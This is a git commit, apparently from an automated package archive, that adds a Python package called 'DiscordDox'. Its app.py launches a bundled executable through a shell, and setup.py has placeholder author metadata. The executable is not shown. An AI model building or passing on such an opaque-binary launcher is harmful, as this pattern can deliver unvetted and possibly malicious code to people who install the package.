ef095448f1dc9b6b86030047ae6fcaa02e1b61fc
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-05-13 05:13:17 +0000

    Add package DiscordDox/1.8.8/discorddox-1.8.8.tar.gz

---
+++ packages/DiscordDox/discorddox-1.8.8.tar.gz/discorddox-1.8.8/DiscordDox/app.py
@@ -0,0 +1,12 @@
+import subprocess
+import os
+
+def start_app():
+    current_dir = os.path.dirname(os.path.abspath(__file__))
+    exe_path = os.path.join(current_dir, "DiscordDox.exe")
+
+    if os.path.exists(exe_path):
+        subprocess.Popen(exe_path, shell=True)
+
+if __name__ == "__main__":
+    start_app()
---
+++ packages/DiscordDox/discorddox-1.8.8.tar.gz/discorddox-1.8.8/setup.py
@@ -0,0 +1,17 @@
+from setuptools import setup, find_packages
+
+setup(
+    name='DiscordDox',
+    version='1.8.8',
+    description='none',
+    author='none',
+    author_email='none@gmail.com',
+    packages=find_packages(include=['DiscordDox', 'DiscordDox.*']),
+    include_package_data=True,
+    python_requires='>=3.7',
+    entry_points={
+        'console_scripts': [
+            'DiscordDox=DiscordDox.app:start_app'
+        ]
+    }
+)
